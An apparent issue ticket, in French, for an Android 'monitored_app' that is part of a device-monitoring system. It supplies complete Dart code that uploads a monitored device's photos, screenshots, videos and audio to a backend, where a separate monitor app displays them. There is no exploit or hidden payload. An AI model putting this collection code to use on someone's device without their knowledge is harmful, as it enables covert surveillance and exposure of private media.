# Monitored App Issue — Uploader de fichiers médias inexistant (dernier chaînon)

**Issue Type**: MONITORED_APP_ISSUE_MISSING
**Date Created**: 2026-06-12
**Status**: 🔴 Bloqué — implémentation monitored_app requise (code complet fourni ci-dessous)
**Priority**: Critique — dernier chaînon manquant de la fonctionnalité Médias
**Cible**: `monitored_app` (Android)
**Device ID test**: `9989a82e-fcd6-4ceb-a2fd-3df0dd3dd721`

---

## Issue Summary

La chaîne médias est prête aux deux extrémités mais **personne n'envoie les fichiers** :

| Maillon | État |
|---|---|
| Backend `POST /api/v1/media/{id}/upload/` (multipart `file`/`thumbnail`, limites 25 MB / 200 KB, génération Pillow de vignette pour les photos) | ✅ implémenté (`apps/media/views.py:104-181`) |
| Backend serializer : `download_url`/`thumbnail_url` renseignés dès que `storage_status ∈ {STORED, TRANSFERRED}` / `thumbnail_path` non-null | ✅ implémenté (`serializers.py:16-37`) |
| monitor_app : affichage authentifié des vignettes/fichiers, placeholders propres si URLs null | ✅ implémenté |
| **monitored_app : appel de l'endpoint upload** | ❌ **inexistant** — aucun code n'appelle `/media/{id}/upload/` |

Résultat : 45/45 médias restent `storage_status: TEMP`, `thumbnail_url: null`, `download_url: null`.

## Required Changes — implémentation complète

### A. Nouveau fichier `lib/core/services/media_upload_service.dart`

Briques réutilisées (toutes existantes) : `ApiClient` (Dio + auth, pattern `FormData` identique à
`uploadEmergencyMedia`, `api_client.dart:225`), `ConnectivityService` (`connectivity_service.dart`),
package `image: ^4.1.7` (pubspec).

```dart
import 'dart:io';

import 'package:dio/dio.dart';
import 'package:flutter/foundation.dart';
import 'package:image/image.dart' as img;

import 'package:monitored_app/core/api/api_client.dart';
import 'package:monitored_app/core/services/connectivity_service.dart';

/// Téléverse vers le backend les fichiers médias (et leurs vignettes) dont
/// seules les métadonnées ont été synchronisées (`storage_status == TEMP`).
///
/// Backend : POST /api/v1/media/{id}/upload/ — multipart, champs `file`
/// (≤ 25 MB) et/ou `thumbnail` (JPEG ≤ 200 KB). Le backend génère lui-même
/// la vignette des photos si seul `file` est fourni.
class MediaUploadService {
  final ApiClient _apiClient;
  final ConnectivityService _connectivityService;

  MediaUploadService(this._apiClient, this._connectivityService);

  static const int _maxFileBytes = 25 * 1024 * 1024; // limite backend
  static const int _maxThumbBytes = 200 * 1024;      // limite backend
  static const int _wifiOnlyThresholdBytes = 2 * 1024 * 1024;
  static const int _maxUploadsPerCycle = 10;

  bool _isRunning = false;

  /// Lance un cycle d'upload. Appelé après chaque sync média réussie
  /// et périodiquement (voir intégration DataCollectorService).
  Future<void> uploadPendingMedia(String deviceId) async {
    if (_isRunning) {
      debugPrint('[MediaUpload] cycle skipped: already running');
      return;
    }
    _isRunning = true;
    try {
      final pending = await _fetchPendingMedia(deviceId);
      debugPrint('[MediaUpload] ${pending.length} TEMP media on backend');

      var uploaded = 0;
      for (final media in pending) {
        if (uploaded >= _maxUploadsPerCycle) break;
        if (await _uploadOne(media)) uploaded++;
      }
      debugPrint('[MediaUpload] cycle done: $uploaded uploads');
    } catch (e) {
      debugPrint('[MediaUpload] cycle failed: $e');
    } finally {
      _isRunning = false;
    }
  }

  /// Liste les médias du device encore en TEMP côté backend (avec pagination).
  Future<List<Map<String, dynamic>>> _fetchPendingMedia(String deviceId) async {
    final items = <Map<String, dynamic>>[];
    String? url = '/media/';
    Map<String, dynamic>? params = {'device': deviceId};

    while (url != null) {
      final response = await _apiClient.get(url, queryParameters: params);
      final data = response.data as Map<String, dynamic>;
      for (final raw in (data['results'] as List<dynamic>? ?? const [])) {
        final item = Map<String, dynamic>.from(raw as Map);
        if (item['storage_status'] == 'TEMP') items.add(item);
      }
      url = data['next'] as String?;
      params = null; // l'URL `next` du DRF contient déjà les query params
    }
    return items;
  }

  /// Upload d'un média : vignette pour les photos, fichier complet si la
  /// taille et le réseau le permettent. Retourne true si au moins une pièce
  /// a été envoyée.
  Future<bool> _uploadOne(Map<String, dynamic> media) async {
    final id = media['id']?.toString();
    final localPath = media['local_path']?.toString();
    final mediaType = media['media_type']?.toString() ?? '';
    if (id == null || localPath == null || localPath.isEmpty) return false;

    final file = File(localPath);
    if (!await file.exists()) {
      debugPrint('[MediaUpload] $id: local file missing ($localPath)');
      return false;
    }

    final fileSize = await file.length();
    final isWifi = await _connectivityService.isWifiConnected();
    final canSendFile = fileSize <= _maxFileBytes &&
        (fileSize <= _wifiOnlyThresholdBytes || isWifi);

    final formMap = <String, dynamic>{};

    if (canSendFile) {
      formMap['file'] = await MultipartFile.fromFile(
        localPath,
        filename: media['file_name']?.toString(),
      );
    }

    // Vignette générée côté client pour les images (le backend sait aussi la
    // générer depuis `file`, mais la vignette client couvre le cas fichier
    // trop lourd / réseau mobile : l'utilisateur voit au moins la miniature).
    if ((mediaType == 'PHOTO' || mediaType == 'SCREENSHOT') && !canSendFile) {
      final thumbBytes = await _buildThumbnail(file);
      if (thumbBytes != null) {
        formMap['thumbnail'] = MultipartFile.fromBytes(
          thumbBytes,
          filename: 'thumb_$id.jpg',
        );
      }
    }

    if (formMap.isEmpty) {
      debugPrint('[MediaUpload] $id: nothing uploadable '
          '(size=$fileSize, wifi=$isWifi, type=$mediaType)');
      return false;
    }

    try {
      await _apiClient.post('/media/$id/upload/', data: FormData.fromMap(formMap));
      debugPrint('[MediaUpload] $id uploaded (${formMap.keys.join('+')})');
      return true;
    } catch (e) {
      debugPrint('[MediaUpload] $id upload failed: $e');
      return false;
    }
  }

  /// JPEG ≤ 200 KO, bord max 320 px (compute → ne bloque pas l'UI).
  Future<Uint8List?> _buildThumbnail(File source) async {
    try {
      final bytes = await source.readAsBytes();
      return await compute(_encodeThumbnail, bytes);
    } catch (e) {
      debugPrint('[MediaUpload] thumbnail failed: $e');
      return null;
    }
  }

  static Uint8List? _encodeThumbnail(Uint8List bytes) {
    final decoded = img.decodeImage(bytes);
    if (decoded == null) return null;
    final resized = img.copyResize(
      decoded,
      width: decoded.width >= decoded.height ? 320 : null,
      height: decoded.height > decoded.width ? 320 : null,
    );
    var quality = 70;
    var encoded = img.encodeJpg(resized, quality: quality);
    while (encoded.length > _maxThumbBytes && quality > 20) {
      quality -= 15;
      encoded = img.encodeJpg(resized, quality: quality);
    }
    return Uint8List.fromList(encoded);
  }
}
```

> Adapter si besoin : nom exact de la méthode Wi-Fi de `ConnectivityService`
> (`isWifiConnected()` ici — utiliser l'API réelle du service, cf. `connectivity_service.dart:33`).

### B. Enregistrement + déclenchement

1. **Locator** (`lib/app/locator.dart`) :

```dart
locator.registerLazySingleton(
  () => MediaUploadService(locator<ApiClient>(), locator<ConnectivityService>()),
);
```

2. **DataCollectorService** — déclencher après chaque sync réussie incluant
`media_metadata`, et dans le cycle périodique média (même cadence que le scan MediaStore) :

```dart
// après "Optimized bulk sync completed" / sync média OK :
unawaited(locator<MediaUploadService>().uploadPendingMedia(_deviceId));
```

`_maxUploadsPerCycle = 10` garantit une progression sans saturer batterie/réseau :
45 médias ≈ 5 cycles.

## Comportement attendu après déploiement

- Photos ≤ 2 MB (ou Wi-Fi) → fichier complet uploadé → backend `STORED` + vignette Pillow → monitor_app
  affiche la **vignette dans la grille** et l'**image plein écran** au clic.
- Photos hors critères → vignette client 320px quand même → miniature visible.
- Vidéos ≤ 25 MB sur Wi-Fi (ex. Snapchat 3,9 MB ✓) → fichier dispo au téléchargement ; `Auto-Suggestion.avi`
  (210 MB) → ignoré proprement (au-delà de la limite backend).
- Audio ≤ 25 MB → fichier uploadé, lecture/téléchargement possibles.

## Verification Steps

1. Déployer monitored_app, déclencher une sync (ouvrir l'app / attendre le cycle).
2. Logs monitored_app : `[MediaUpload] N TEMP media on backend` puis `… uploaded (file)` / `(thumbnail)`.
3. Backend : `GET /api/v1/media/?device=9989a82e…` → items avec `storage_status: STORED`,
   `thumbnail_url` non-null, `download_url` non-null.
4. monitor_app → Médias : vignettes visibles dans la grille ; clic → image affichée (plus de
   "Fichier non disponible sur le serveur" pour les items uploadés).
5. Logs backend : aucun 400/413 sur `/upload/` ; aucun "local file is missing" sur `download/`.

## Cross-References

- `BACKEND_ISSUE_MISSING_MEDIA_UPLOAD_ENDPOINT_20260610.md` — ✅ volet backend réalisé le 2026-06-12.
- `MONITORED_APP_ISSUE_MEDIA_FILES_AND_DURATION_20260607.md` — B1 : ce document en est l'implémentation.

---

**Équipe frontend (monitor_app)** : Eric Vekout — **Date de notification** : 2026-06-12
